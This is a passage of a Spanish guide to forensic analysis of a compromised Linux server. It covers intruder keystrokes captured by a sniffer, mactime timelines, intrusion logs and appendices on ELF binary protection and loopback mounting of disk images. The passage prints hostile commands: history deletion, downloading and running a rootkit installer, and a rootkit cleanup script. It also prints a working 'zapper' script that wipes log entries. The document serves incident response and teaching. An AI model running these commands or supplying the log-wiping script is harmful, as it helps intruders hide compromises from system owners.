+ rm -rf .bash*
+ ftp XXXXXX.XXX.XXX
+ anonymous
+ ass
+ get XXXX.tgz
+ quituit
+ tar zxvf XXXX.tgz
+ chmod +x *
+ ./INSTALL
+ ls -al
+</pre><pre class="programlisting">
+ ----- [Timed Out]
+</pre><pre class="programlisting">
+ IIIIIIIIII.XXXXXXX.XXX.XX =&gt; GGGGGGG.XXXXXXXXXX.XXX [23]
+  !&quot;'%P#$ 38400,38400linuxr00t
+ pico /etc/rc.d/irc.inetd2
+ rpc.mo.mo.mo.mountd
+ [A11
+ mountd
+ [A2
+ pmountd
+ [A[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[B[C[C# [B[D[D#[B[D#[B[D# y
+ pico /etc/inetd.conf
+ [6~[6~killall -HUP inetd
+ cat /etc/inetd.conf
+ ps aux
+ kill -9 cd /dev
+ mkdir XXXXXXXX
+ cd XXXXXXXX
+ pico LS
+ XXXXXXXX
+ XXXXXy
+ pico PS
+ 3 bindshell
+ 3 linsniffery
+ ps aux
+ kill -9 2541
+ f
+ ----- [Timed Out]
+</pre><p>
+Eso muestra que el intruso estaba editando el fichero de configuración
+del rootkit referente al modus operandi de la utilidad &quot;ls&quot; (llamado
+LS) para esconder ficheros/directorios con cadenas &quot;XXXXXX&quot; y/o
+&quot;JJJJJJJJ&quot; en sus nombres. También ha modificado el fichero de
+configuración del rootkit para la utilidad &quot;ps&quot; (llamado PS) para
+esconder procesos &quot;bindshell&quot; y &quot;linsniffer&quot; en sus nombres.
+</p><p>
+La letra &quot;y&quot; que aparece en las cadenas &quot;XXXXXXy&quot; y &quot;linsniffery&quot; son
+huellas del usuario que nos informan que ha sido utilizado el editor
+&quot;pico&quot;. El comando para guardar las modificaciones en los ficheros y
+salir en pico es Ctrl-X. Si el fichero ha sido modificado de alguna
+forma el siguiente texto aparece:
+</p><pre class="programlisting">
+ Save modified buffer (ANSWERING &quot;No&quot; WILL DESTROY CHANGES) ?
+</pre><p>
+El usuario entonces debe teclear la letra &quot;y&quot; para guardar el fichero
+y salir. El sniffer no captura el mensaje del sistema pero sí el
+&quot;y&quot;. Las entradas log del sniffer aquí muestran que se creó el
+directorio XXXXXXXX, dónde fueron insertados los ficheros de
+configuración del rootkit y editados en siguiente orden. Podemos
+observarlo en el listado de mactime, posiblemente atando este evento
+al día 15 del XXX a las 02:26:
+</p><pre class="programlisting">
+  Sep 15 01 02:26:26    7416 .a. -rwxr-xr-x root     bin      /x/bin/mkdir
+  Sep 15 01 02:26:33      15 m.c -rw-r--r-- root     root     /x/dev/XXXXXXXX/LS
+  Sep 15 01 02:26:40    1024 m.c drwxr-xr-x root     root     /x/dev/XXXXXXXX
+                          25 m.c -rw-r--r-- root     root     /x/dev/XXXXXXXX/PS
+</pre><p>
+El día 16 del Sep alguien crea una copia de seguridad del log del
+sniffer (&quot;sniffer.log.save&quot;), moviéndolo al directorio
+&quot;/var/tmp/XXXX/programs&quot;. Este fichero muestra los intentos de entrada
+de otros intrusos que también acceden al fichero &quot;tcp.log&quot;:
+</p><pre class="programlisting">
+  Sep 16 01 21:55:34   36088 .a. -rwxr-xr-x root     bin      /x/bin/netstat
+  Sep 16 01 21:58:27    1024 m.c drwxrwxrwx root     root     /x/var/tmp
+  Sep 16 01 21:58:52       6 .a. -rw-r--r-- root     root     /x/root/temp.txt
+  Sep 16 01 22:50:33    1024 .a. drwxr-xr-x root     root     /x/var/tmp/XXXXX
+  Sep 16 01 22:51:02    6644 .a. -rw-r--r-- root     root     /x/var/tmp/XXXXX/programs/sniffer.log
+  Sep 16 01 22:57:16    1024 .a. drwxr-xr-x root     root     /x/var/tmp/XXXXX/programs
+  Sep 16 01 23:39:51    1024 m.c drwxr-xr-x root     root     /x/var/tmp/XXXXX/programs
+                        4992 mac -rw-r--r-- root     root     /x/var/tmp/XXXXX/programs/sniffer.log.save
+</pre><p>
+El fichero &quot;/root/temp.txt&quot; contiene la única palabra &quot;blah&quot; en la
+línea y una línea en blanco. Actualmente no se conoce para que sirvió
+el fichero. El día 17 del XXX se modifica la contraseña de algún
+usuario, se crea un fichero de copia de seguridad:
+</p><pre class="programlisting">
+  Sep 17 01 12:44:50  153384 .a. -rws--x--x root     bin      /x/usr/bin/passwd
+  Sep 17 01 12:45:05    1649 m.c -rw-r--r-- root     root     /x/etc/passwd
+                        1649 ..c -rw-r--r-- root     root     /x/etc/passwd.OLD
+</pre><p>
+A continuación, el día 17 del Sep, alguien accede al servidor a través
+de telnet. Por lo visto se obtiene el UID del usuario
+lp. Modificaciones en /dev/console indican que ocurrió también una
+entrada de usuario en la consola física. Fechas de modificación han
+sido cambiadas en la aplicación de los logs del sniffer
+&quot;/etc/..__/tcp.log&quot; y también &quot;/var/tmp/XXXXX/programs/sniffer.log&quot;,
+que significa que las aplicaciones han sido desactivadas.
+</p><pre class="programlisting">
+  Sep 17 01 20:13:44     296 .a. -rw-r--r-- root     root     /x/etc/hosts.deny
+                       40907 .a. -rwxr-xr-x root     bin      /x/usr/sbin/tcpd
+  Sep 17 01 20:13:45   40685 .a. -rwxr-xr-x root     bin      /x/usr/sbin/in.telnetd
+                          25 m.c -rw-rw-r-- root     root     /x/var/spool/lp1/status
+  Sep 17 01 20:13:46       0 m.. crw-rw-rw- root     root     /x/dev/console
+                           0 .a. crw-rw-rw- root     root     /x/dev/ptyp0
+                           0 m.. crw-rw-rw- root     root     /x/dev/ttyp0
+                       18476 m.c -rw-r--r-- root     root     /x/etc/..___/tcp.log
+                        6644 m.c -rw-r--r-- root     root     /x/var/tmp/XXXXX/programs/sniffer.log
+  Sep 17 01 20:13:50       0 ..c crw-rw-rw- root     root     /x/dev/console
+                           0 ..c crw-rw-rw- root     root     /x/dev/ptyp0
+                           0 ..c crw-rw-rw- root     root     /x/dev/ttyp0
+</pre><p>
+El día 18 de Sep, se ejecuta la aplicación sendmail. Las huellas en el
+sistema de ficheros nos muestran que, posiblemente se envió a una
+dirección de correo electrónico el fichero log del sniffer &quot;tcp.log&quot;:
+</p><pre class="programlisting">
+  Sep 18 01 05:30:26  164060 .a. -r-sr-Sr-x root     bin      /x/usr/sbin/sendmail
+</pre><p>
+Aparte de analizar el sistema de ficheros con detenimiento, se han
+recuperado todos los ficheros eliminados utilizando la utilidad &quot;unrm&quot;
+de TCT. Una examen de los ficheros recuperados mostró eliminación de
+algunos ficheros log y scripts. El siguiente es una parte del script
+de instalación/limpieza que está incluido con el rootkit.
+</p><pre class="programlisting">
+ cp /var/tmp/imap-d /var/tmp/XXXXX/programs/imapdis
+ rm -rf /var/tmp/imap-d
+ echo &quot;6. cleaning logs&quot;
+ cd /var/tmp/XXXXX
+ cp /var/tmp/clean /var/tmp/XXXXX/programs/clean
+ rm -rf /var/tmp/clean
+ /var/tmp/XXXXX/programs/clean XXXXXXX 1&gt;/dev/null 2&gt;/dev/null
+ /var/tmp/XXXXX/programs/clean XXX.XXX 1&gt;/dev/null 2/dev/null
+ /var/tmp/XXXXX/programs/clean XXXX 1&gt;/dev/null 2&gt;/dev/null
+ echo &quot;rootkit complete&quot;
+ echo &quot;rember to disable imapd&quot;
+ echo &quot;EOF&quot;
+</pre><p>
+El siguiente es una parte del fichero log que muestra intentos de
+conexión de intrusos:
+</p><pre class="programlisting">
+ Sep 11 15:26:11 XXXX in.fingerd[864]: connect from XXX-XXX-14.XXXXXXXXX.XXX
+ Sep 11 15:26:11 XXXX in.telnetd[865]: connect from XXX-XXX-14.XXXXXXXXX.XXX
+ Sep 11 15:26:11 XXXX telnetd[865]: ttloop:  peer died: Try again
+ Sep 11 15:26:12 XXXX in.pop3d[866]: connect from XXX-XXX-14.XXXXXXXXX.XXX
+ Sep 11 15:26:13 XXXX in.telnetd[867]: connect from XXX-XXX-14.XXXXXXXXX.XXX
+  . . .
+ Sep 12 05:36:20 XXXX in.telnetd[1126]: connect from DDDDDD.XXXXXX.XXX
+  . . .
+ Sep 12 11:01:52 XXXX in.telnetd[1213]: connect from EEEEEEE.XXX.XXX
+ Sep 12 11:02:21 XXXX su: XXXXX on /dev/ttyp1
+  . . .
+ Sep 12 11:04:28 XXXX in.rlogind[1229]: connect from CCCCCCCC.XXXXXXXX.XXX
+ Sep 12 11:04:44 XXXX in.rlogind[1230]: connect from CCCCCCCC.XXXXXXXX.XXX
+  . . .
+ Sep 12 11:08:57 XXXX su: XXXXX on /dev/ttyp1
+ Sep 12 11:11:19 XXXX su: XXXXX on /dev/ttyp1
+  . . .
+ Sep 12 11:33:05 XXXX in.telnetd[1290]: connect from AAAAAA.XXXXXX.XXX
+ Sep 12 11:33:16 XXXX login: 1 LOGIN FAILURE FROM AAAAAA.XXXXXX.XXX, XXX
+ Sep 12 11:33:21 XXXX login: 2 LOGIN FAILURES FROM AAAAAA.XXXXXX.XXX, XXX
+  . . .
+ Sep 12 11:34:02 XXXX su: XXXXX on /dev/ttyp1
+ Sep 12 11:41:52 XXXX wu.ftpd[1327]: connect from BBBBBBB.XXXXXX.XXX
+ Sep 12 11:41:57 XXXX ftpd[1327]: USER XXXXX
+ Sep 12 11:41:59 XXXX ftpd[1327]: PASS password
+ Sep 12 11:42:00 XXXX ftpd[1327]: SYST
+ Sep 12 11:42:01 XXXX ftpd[1327]: CWD /tmp
+ Sep 12 11:42:06 XXXX ftpd[1327]: TYPE Image
+ Sep 12 11:42:06 XXXX ftpd[1327]: PORT
+ Sep 12 11:42:06 XXXX ftpd[1327]: STOR mountd
+ Sep 12 11:42:08 XXXX ftpd[1327]: QUIT
+ Sep 12 11:42:08 XXXX ftpd[1327]: FTP session closed
+ Sep 12 12:00:25 XXXX in.telnetd[1342]: connect from AAAAAA.XXXXXX.XXX
+ Sep 12 12:00:25 XXXX telnetd[1342]: ttloop:  peer died: Try again
+  . . .
+ Sep 12 12:54:37 XXXX in.rlogind[1358]: connect from CCCCCCCC.XXXXXXXX.XXX
+  . . .
+ Sep 12 19:53:30 XXXX in.telnetd[1459]: connect from XXXX-XX-118.XXXXXXXXX.XXX
+  . . .
+ Sep 12 23:47:32 XXXX in.telnetd[1525]: connect from XXXXXX.XXXX.XXXXXXXXXX.XXX
+ Sep 12 23:47:41 XXXX login: 1 LOGIN FAILURE FROM XXXXXX.XXXX.XXXXXXXXXX.XXX, XXXXX
+ Sep 12 23:48:55 XXXX su: XXXXX on /dev/console
+ Sep 13 00:12:38 XXXX in.telnetd[1569]: connect from HHHHHH.XXXXXXXXXXXXXXX.XXX
+ Sep 13 00:12:54 XXXX su: XXXXX on /dev/console
+  . . .
+ Sep 13 06:46:12 XXXX in.telnetd[1673]: connect from XXX.XX.XXX.XX
+ Sep 13 07:08:01 XXXX in.telnetd[1679]: connect from GGGGGGG.XXXXXXXXXXXXXX.XXX
+ Sep 13 07:08:14 XXXX su: XXXXX on /dev/console
+  . . .
+ Sep 13 08:30:05 XXXX in.telnetd[1728]: connect from FFFFFFF.XXXXXXXXXXXXXX.XXX
+ Sep 13 08:30:22 XXXX in.telnetd[1731]: connect from HHHHHH.XXXXXXXXXXXXXXX.XXX
+ Sep 13 08:32:34 XXXX in.telnetd[1733]: connect from FFFFFFF.XXXXXXXXXXXXXX.XXX
+  . . .
+ Sep 13 09:58:42 XXXX su: XXXXX on /dev/console
+</pre><p>
+El siguiente ejemplo es un extracto de script &quot;zapper&quot; que elimina las
+huellas dejadas por el intruso, o restablece el tamaño de los ficheros
+log a 0 bytes. No se sabe si existe una copia de este script en el
+sistema de ficheros activo.
+</p><div class="orderedlist"><ol type="1"><li><p>!/bin/bash</p></li></ol></div><pre class="programlisting">
+  . . .
+ WHAT=$(/bin/ls -F /var/log | grep -v &quot;/&quot; | grep -v &quot;*&quot; | grep -v &quot;.tgz&quot; | grep -v &quot;.gz&quot; | grep -v &quot;.tar&quot; | grep -v &quot;@&quot;)
+ for file in $WHAT
+    line=$(wc -l /var/log/$file | awk -F ' ' '{print $1}')
+    echo -n &quot;Cleaning $file ($line lines)...&quot;
+    grep -v $1 /var/log/$file &gt; new
+    mv -f new /var/log/$file
+    newline=$(wc -l /var/log/$file | awk -F ' ' '{print $1}')
+    let linedel=$(($line-$newline))
+    echo &quot;$linedel lines removed!&quot;
+ done
+ echo &quot; &quot;
+</pre><p>
+Los siguientes cadenas de texto pertenecen al fichero wtmp (leído por
+la utilidad &quot;last&quot;). Las horas no son obvias aquí pero los nombres de
+hosts sí lo son.
+</p><pre class="programlisting">
+ ftp4264
+ ttyp1
+ 3XXXXX
+ XXXXXXXXXXXX
+ ttyp1
+ Pftp4626
+ 3XXXXX
+ XXXXXXXXXXXX
+ ttyp1
+ 3XXXXX
+ XXXXXXXXXXXX
+ ftp4626
+ ttyp1
+ Pftp4639
+ 3XXXXXXXX
+ XXX.XX.XXX.XX
+ Pftp4639
+ Pftp4653
+ 3XXXXXX
+ XXXXXXXXXXXX
+ ftp4653
+ Pftp4743
+ 3XXXXX
+ XXXXXXXXXXXXXXXX
+</pre></div><div class="sect1"><div class="titlepage"><div><h2 class="title" style="clear: both"><a name="id2759274"></a>11. Apéndice A - Métodos de Protección de Binarios </h2></div></div><div class="sect2"><div class="titlepage"><div><h3 class="title"><a name="id2759281"></a>11.1. Introducción </h3></div></div><p>
+Los sistemas operativos Unix/Linux, *BSD se consideran por los
+especialistas como avanzados, seguros y estables debido a su diseño de
+arquitectura y gestión de procesos.
+</p><p>
+Las distribuciones actuales tienen soporte para varios tipos de
+ejecutables como AOUT (formato original de Unix), COFF (Unix System
+V), ECOFF (Mips/Alfpha), XCOFF (IBM RS/6000, AIX) y finalmente ELF (el
+sucesor de COFF, que ofrece múltiples secciones y valores posibles de
+32 o 64 bits). Mientras que los sistemas operativos win32 tienen MZ
+(dos), NE (Windows 3.xx) y PE (Win9x/NT).
+</p><p>
+La popularidad y el enfoque comercial de sistemas win32 obligó a las empresas desarrolladoras de software invertir fondos y horas en protección de sus aplicaciones, para evitar obligar a los usuarios comprar el software. Desde el principio los especialistas en ingeniería inversa conseguían, por placer o por negocio, evitar los métodos de protección de los ejecutables que bajo win32 ya entonces tenían múltiples técnicas de protección. En actualidad un fichero ejecutable bajo Windows (PE) puede estar perfectamente cifrado, empaquetado, ofuscado y wrappeado al visa versa a la hora de ejecución lo que muestra la evolución de un binario simple hacía un ejecutable propiamente protegido, lo que proporciona la seguridad a la empresa desarrolladora que su software no podrá ser utilizado de forma ilegal, por lo menos por el público general.
+</p><p>
+Y lo único (que generalmente se conoce) que podemos hacer actualmente
+con un binario ELF es quitarle la tabla de símbolos o en otras
+palabras &quot;strippearlo&quot; que que no ofrece ningún tipo de protección.
+</p><p>
+Existen pocas herramientas de protección, son experimentales y se
+conocen/utilizan solo por los hackers de nivel alto medio-alto. A la
+hora de realizar un análisis forense, nos encontraremos con binarios
+que el intruso ha ido dejando en el sistema y necesitaríamos saber las
+funciones de cada uno de ellos, teniendo en cuenta que ejecución de
+binarios desconocidos puede provocar un desastre, si no estamos
+seguros de la función de los mismos.
+</p></div><div class="sect2"><div class="titlepage"><div><h3 class="title"><a name="id2759388"></a>11.2. Métodos de Protección </h3></div></div><p>
+En las investigaciones rutinarias de casos de &quot;defacements&quot; de páginas
+web o de utilización de la máquina comprometida como cluster DDoS no
+es frecuente encontrar binarios protegidos ya que la mayoría de
+herramientas están circulando por la red de forma abierta. Mientras
+que en los compromisos de sistemas importantes como de Bancos, Líneas
+Aéreas o Universidades, el nivel de intruso es tecnológicamente y
+intelectualmente superior, por lo tanto también lo son sus
+herramientas. Hasta que no sepamos el propósito de cada uno de las
+herramientas del intruso no podremos concluir la investigación con
+éxito.
+</p><p>
+Podemos encontrar siguientes métodos de protección de binarios en este
+caso, según el nivel del atacante y tipo de herramienta
+utilizada. Puede que se utilicen de forma individual o de forma
+combinada para complicar el trabajo del investigador.
+</p><div class="itemizedlist"><ul type="disc"><li><p>UPX [3] - &quot;Ultimate Packer for eXecutables&quot;, los intrusos con un nivel    de conocimientos bajo o medio utilizan compresor de ejecutables UPX    como una herramienta de protección de sus aplicaciones. Este software    tiene soporte para reducir el tamaño de binarios de tipo dos/exe,    dos/com, dos/sys, djgpp2/coff, watcom/le, elf y etc... a través de las    funciones de la librería UCL escrita en ANSI C, por lo tanto ofuscando    su contenido a nivel superficial.  </p><p>
+  Si observamos el output del comando strings vemos que es fácilmente    detectable por la cadena de texto &quot;$Id: analisisforense.html,v 1.1 2002/10/09 20:04:00 villate Exp $&quot; en caso de que UPX no    ha sido modificado. En otros casos cuando el intruso puso su empeño en    modificar la fuentes de UPX para confundir (aun mas) al administrador    el binario sigue perfectamente reconocible observando las cadenas    &quot;/tmp/upxAAAAAAAAAAA&quot;, &quot;/prof&quot;, etc... en el fichero. Para    desempaquetar el binario debemos instalarnos UPX y ejecutar el    siguiente comando:  </p></li></ul></div><pre class="programlisting">
+  [ervin@activalink.com ervin]$ ./upx -d &lt;fichero empaquetado&gt;  
+</pre><div class="itemizedlist"><ul type="disc"><li><p>BurnEye [4] - Este tipo de protección se utiliza por los intrusos con    nivel de conocimientos medio, medio-alto, que conocen la estructura de    binarios ELF. BurnEye ofrece 3 niveles de protección de binarios ELF    por capas: ofuscación de código, cifrado de aplicación a través de    contraseña y técnica de OS fingerprinting.  </p><p>
+  Nivel 1. El primer nivel de protección realiza un cifrado del binario    y utiliza la técnica de inyección de código dentro del binario ELF. El    código es un motor de descifrado que a la hora de ejecutar el programa v</p></li></ul></div><pre class="programlisting">
+  descifra su contenido y lo ejecuta. Podemos detectar si el binario    está protegido con el primer nivel de BurnEye si su output de strings    contiene la cadena &quot;TEEE burneye - TESO ELF Encryption Engine&quot;. En    caso de que el intruso haya modificado las fuentes de BurnEye y no se    observe la cadena de texto en el output, se puede detectar ese nivel    de protección a través de GDB. Esa protección implementa además una    trampa para debuggers que utilizan llamada de sistema ptrace():  \\
+ [ervin@activalink.com dev]$ gdb ./&lt;binario encriptado con burneye nivel 1&gt; GNU gdb 5.2   Copyright 2002 Free Software Foundation, Inc.   [...]   This GDB was configured as &quot;i686-pc-linux-gnu&quot;...(no debugging symbols found)...   (gdb) r   Starting program: /dev/validate_MoD   warning: shared library handler failed to enable breakpoint  \\
+ Program received signal SIGTRAP, Trace/breakpoint trap.   0x053714c7 in ?? ()   (gdb)  \\
+  Normalmente el SIGTRAP en binarios protegidos con BurnEye suele estar    situado en 0x053714c7. Ese nivel de protección de binarios puede ser    superado realizando un dump de memoria, con herramienta memdump y    extracción manual del motor de cifrado (Ver [5] para más información).  \\
+
+  Nivel 2. El segundo nivel de protección de binarios es más completo    que el anterior. Su funcionamiento utiliza la misma técnica de    inyección de código dentro de ELF y cifrado (wrapping). Sólo que en    este caso el motor que se inserta dentro del binario tiene capacidad    de cifrar y descifrar información, realizando una comprobación por    contraseña como clave de cifrado (SHA1). Una vez la clave ha sido    aceptada el nivel de control utiliza RC4 para descifrar el binario    original.  //
+</pre><pre class="programlisting">
+  Para detectar la diferencia entre el nivel 1 y nivel 2, hay que    ejecutar el programa. Por lo tanto hay que asegurarse que no es ni    sGID, sUID. Si lo es hay que crear un usuario con privilegios muy    limitados, cambiar la pertenencia del fichero y quitarle sGID y    sUID. A continuación se puede intentar obtener el listado de librerías    dinámicas utilizadas por el binario:  
+  [ervin@activalink.com dev]$ ldd ./void    ldd: /lib/ld-linux.so.2 exited with unknown exit code (139)  
+  Si se produce el output similar, entonces queda confirmado que el    binario está cifrado y la única opción que tenemos es intentar    ejecutarlo, pero sólo desde la cuenta del usuario con menos    privilegios, por razones de seguridad.  
+  [noone@activalink.com dev]$ ./void    password:    invalid key \\
+
+  Una vez ejecutado el fichero vemos que nos solicita la contraseña y si    pulsamos Enter, nos informa que la clave no es correcta. Ahora estamos    seguros que el fichero está cifrado con BurnEye con protección de    Nivel 2. Este nivel de protección es fácil de romper como el anterior,    será necesario utilizar las técnicas de debugging avanzadas y buen    conocimiento de ensamblador [6]. Se aconseja utilizar un debugger que    no utilice llamada de sistema ptrace(), para intentar saltar la    protección de binarios protegidos [7]. La interacción entre el motor    de cifrado con el binario original es todavía débil por lo tanto    teóricamente se puede utilizar técnicas de &quot;unwrapping&quot; pero si la    contraseña ha sido elegida bien por el intruso, el binario es casi    indescifrable. \\
+
+  Nivel 3. Esta capa de protección tiene un modo de funcionamiento    diferente a los niveles anteriores. Este nivel asegura que el binario    no pueda ser ejecutado en otro sistema que no sea el de máquina dónde    ha sido encontrado (utilizado). El binario incluye internamente un    &quot;sello&quot; del equipo permitido. Y cada vez que se ejecuta el motor de    cifrado interno busca el &quot;sello&quot; de la máquina y si no coincide con el    &quot;fingerprint&quot; almacenado dentro del algoritmo, no permite la ejecución    de la aplicación. El &quot;sello&quot; es único en cada máquina que se calcula a    través de un algoritmo propio desarrollado por TESO; utiliza valores    sysinstall, procpci, proccpu, procmem, procroute, procpartitions    (/proc en general) para generar un único &quot;sello&quot; (fingerprint). Los    binarios protegidos con éste nivel de BurnEye heredan las mismas    pruebas que los niveles anteriores: output strings, breakpoint trap,    etc.  
+  Si estamos estudiando el binario, doy por sentado que nos encontramos    en una estación de análisis y no en el equipo comprometido, por lo    tanto si intentamos ejecutar la aplicación protegida con este nivel de    BurnEye en un entorno seguro (no sUID, no sGID y como usuario con    privilegios limitados) obtendremos el siguiente output:  \\
+  [chrooted@beta.activalink.com chrooted]# ./output    invalid fingerprint  \\
+  Es casi imposible de obtener el binario original si no nos encontramos    en la máquina con un sello reconocido por el ejecutable ya que el    fichero original está cifrado y se descifra con el stream cipher RC4.  
+</pre><div class="itemizedlist"><ul type="disc"><li><p>Elfe [8] - Este tipo de protección se utiliza por los intrusos con    nivel de conocimientos medio, medio-alto, que conocen la estructura de    binarios ELF. Elfe ofrece 1 nivel de protección de binarios ELF a    través de RC4. A través de esta herramienta se puede especificar cual    de las secciones del binario (.text, .data, .rodata) se quiere    proteger. Esa aplicación funciona sólo bajo la arquitectura x86 y    únicamente puede proteger binarios producidos por el compilador gcc y    stripeados, tiene soporte para binarios linkados de forma estática así    como dinámica.  </p></li></ul></div><pre class="programlisting">
+  Comparando esa herramienta con las anteriores, podemos decir que    ofrece menor nivel de protección que BurnEye y mayor que UPX. Se puede    detectar fácilmente que el binario está cifrado con Elfe ya que el    output de la utilidad strings informa en las últimas líneas un texto    similar:  \\
+  password:    Done. Returning to program.    QZ^&amp;  \\
+  También podemos encontrar en el output cadenas de texto de las    secciones que no han sido cifradas, ya que Elfe se limita a cifrar    sólo .text, .data, .rodata máximo y si no se especifica sólo la    sección .text. Las herramientas strace, objdump, de la colección de    herramientas binutils nos podrán ser de utilidad. Si se ejecuta la    aplicación sin saber la contraseña correcta la aplicación puede    colgarse, o producir SIGSEGV Segmentation Fault.  \\
+  Aunque el método de protección no implementa detección de debuggers,    el nivel de dificultad de descifrado de binarios protegidos con Elfe    es similar al 2º y 3º nivel de BurnEye (Para más información ver [9]).  \\
+
+</pre><p>
+Hemos podido observar que las utilidades como BurnEye y Elfe tienen una mayor capacidad de
+ocultación del propósito del binario. Si el intruso ha utilizado estas herramientas de forma
+correcta y precabida sería casi imposible de saber el objetivo del fichero. El decifrado es
+posible pero complejo que necesita conocimientos avanzados de ingeniería inversa y 
+análisis criptográfico.
+</p></div></div><div class="sect1"><div class="titlepage"><div><h2 class="title" style="clear: both"><a name="id2759782"></a>12. Apéndice B - Sistema de Ficheros Loopback de Linux </h2></div></div><p>
+El kernel de Linux tiene soporte vara múltiples sistemas de fichero
+(ver &quot;man mount&quot;) tales como: adfs, affs, autofs, coda, coherent,
+devpts, efs, ext, ext2, hfs, hpfs, iso9660, minix, msdos, ncpfs, nfs,
+ntfs, proc, qnx4, romfs, smbfs, sysv, udf, ufs, umsdos, vfat, xenix,
+xiafs.
+</p><p>
+Los sistemas de ficheros coherent, sysv y xenix son idénticos y en el
+futuro no se mencionarán los tres sino, se limitará a utilizar el
+nombre sysv.
+</p><p>
+El soporte de una variedad de sistemas de ficheros por el kernel de
+GNU/Linux nos ofrece una buena plataforma de análisis ya que no
+tendremos que cambiar ni de máquina ni de sistema operativo para
+estudiar un sistema comprometido que no sea GNU/Linux.
+</p><p>
+Linux también tiene soporte para dispositivos &quot;loopback&quot;, que permiten
+montar un sistema de ficheros dentro del fichero. Este método se
+utiliza dentro de los discos arrancables, CD-ROMs auto-ejecutables,
+sistemas de fichero cifrados para laptops, etc. Para más información
+podemos leer siguiente documentación de losetup(8), mount(8) [30].
+</p><p>
+Los dispositivos &quot;loop&quot; en las versiones anteriores de GNU/Linux eran
+8 por defecto y se utilizaban de forma indirecta por el comando
+&quot;mount&quot;, mientras que actualmente son 16. Estos dispositivos se
+encuentran en el directorio /dev junto con el resto de dispositivos.
+</p><pre class="programlisting">
+ [static@lowershaft.activalink dev]$ ls -l /dev/loop*
+ brw-rw----    1 root     root       7,   0 Apr 11 16:25 /dev/loop0
+ brw-rw----    1 root     root       7,   1 Apr 11 16:25 /dev/loop1
+ brw-rw----    1 root     root       7,  10 Apr 11 16:25 /dev/loop10
+ brw-rw----    1 root     root       7,  11 Apr 11 16:25 /dev/loop11
+ brw-rw----    1 root     root       7,  12 Apr 11 16:25 /dev/loop12
+ brw-rw----    1 root     root       7,  13 Apr 11 16:25 /dev/loop13
+ brw-rw----    1 root     root       7,  14 Apr 11 16:25 /dev/loop14
+ brw-rw----    1 root     root       7,  15 Apr 11 16:25 /dev/loop15
+ brw-rw----    1 root     root       7,   2 Apr 11 16:25 /dev/loop2
+ brw-rw----    1 root     root       7,   3 Apr 11 16:25 /dev/loop3
+ brw-rw----    1 root     root       7,   4 Apr 11 16:25 /dev/loop4
+ brw-rw----    1 root     root       7,   5 Apr 11 16:25 /dev/loop5
+ brw-rw----    1 root     root       7,   6 Apr 11 16:25 /dev/loop6
+ brw-rw----    1 root     root       7,   7 Apr 11 16:25 /dev/loop7
+ brw-rw----    1 root     root       7,   8 Apr 11 16:25 /dev/loop8
+ brw-rw----    1 root     root       7,   9 Apr 11 16:25 /dev/loop9
+</pre><p>
+Combinar dos utilidades como dd y mount es más fácil de lo que puede
+pensar. Puede hacer una prueba copiando imágenes de cada partición con
+dd del sistema de ficheros de la víctima, los copia a su sistema y les
+monta utilizando dispositivos &quot;loopback&quot;. Para nuestro ejemplo, las
+particiones fueron obtenidos de un disco duro interno de una Sun SPARC
+ejecutando Solaris 2.5:
+</p><pre class="programlisting">
+ # ls -l c0t3d0*
+ -rw-r--r--    1 root     root     189399040 Sep 14 12:44 c0t3d0s0.dd
+ -rw-r--r--    1 root     root     171991040 Sep 14 13:15 c0t3d0s1.dd
+ -rw-r--r--    1 root     root     220733440 Sep 14 12:57 c0t3d0s3.dd
+ -rw-r--r--    1 root     root     269475840 Sep 14 12:51 c0t3d0s6.dd
+ -rw-r--r--    1 root     root     515973120 Sep 14 13:48 c0t3d0s7.dd
+</pre><p>
+Puede montar la imagen en modo solo lectura especificando que es un
+sistema de ficheros UFS de tipo &quot;sun&quot; y que deseamos utilizar un
+dispositivo loopback de siguiente manera:
+</p><pre class="programlisting">
+ # mount -o ro,loop,ufstype=sun -t ufs c0t3d0s0.dd /t
+</pre><p>
+Desde aquí podemos determinar donde apuntaban el resto de las
+particiones buscando el dispositivo en el sistema de víctima
+/etc/vfstab (montado en este ejemplo bajo /t):
+</p><pre class="programlisting">
+ # grep c0t3d0 /t/etc/vfstab
+ /dev/dsk/c0t3d0s1	-	-	swap	-	no	-
+ /dev/dsk/c0t3d0s0	/dev/rdsk/c0t3d0s0	/	ufs	1	no	-
+ /dev/dsk/c0t3d0s6	/dev/rdsk/c0t3d0s6	/usr	ufs	1	no	-
+ /dev/dsk/c0t3d0s3	/dev/rdsk/c0t3d0s3	/var	ufs	1	no	-
+ /dev/dsk/c0t3d0s7	/dev/rdsk/c0t3d0s7	/export/home	ufs 2	yes	-
+</pre><p>
+Ahora podemos montar otras particiones de siguiente manera:
+</p><pre class="programlisting">
+ # mount -o ro,loop,ufstype=sun -t ufs c0t3d0s3.dd /t/var
+ # mount -o ro,loop,ufstype=sun -t ufs c0t3d0s6.dd /t/usr
+ # mount -o ro,loop,ufstype=sun -t ufs c0t3d0s7.dd /t/export/home
+</pre><p>
+Ahora el contenido del sistema de ficheros es visible a las
+herramientas forenses de TCT como por ejemplo &quot;grave-robber&quot;.
+</p><pre class="programlisting">
+ # df
+ Filesystem           1k-blocks      Used Available Use% Mounted on
+  . . .
+ /x/c0t3d0s0.dd          173791     68725     87696  44% /t
+ /x/c0t3d0s3.dd          202423     26148    156035  14% /t/usr
+ /x/c0t3d0s6.dd          246743    197592     24481  89% /t/var
+ /x/c0t3d0s7.dd          473031    111506    314225  26% /t/export/home
+</pre><pre class="programlisting">
+ # mount
+  . . .
+ /x/c0t3d0s0.dd on /t type ufs (ro,loop=/dev/loop0,ufstype=sun)
+ /x/c0t3d0s3.dd on /t/usr type ufs (ro,loop=/dev/loop1,ufstype=sun)
+ /x/c0t3d0s6.dd on /t/var type ufs (ro,loop=/dev/loop2,ufstype=sun)
+ /x/c0t3d0s7.dd on /t/export/home type ufs (ro,loop=/dev/loop3,ufstype=sun)
+</pre><div class="sect2"><div class="titlepage"><div><h3 class="title"><a name="id2759987"></a>12.1. Conclusiones </h3></div></div><p>
+Con el transcurso de tiempo, las empresas que manejan la información privilegiada
+han aprendido que para asegurar la integridad, privacidad de información no se debe
+ahorrar en sistemas de seguridad, planes de contingencia. Los administradores
+sin previa experiencia de análisis forense no deben precipitarse a la hora de reestablecer
+el servidor parcheandolo rapidamente para que esté operativo lo antes posible, ya que
+sólo un análisis forense exhaustivo puede determinar el alcanze del incidente y
+responder a todas las preguntas que surgen tras sufrir un ataque.
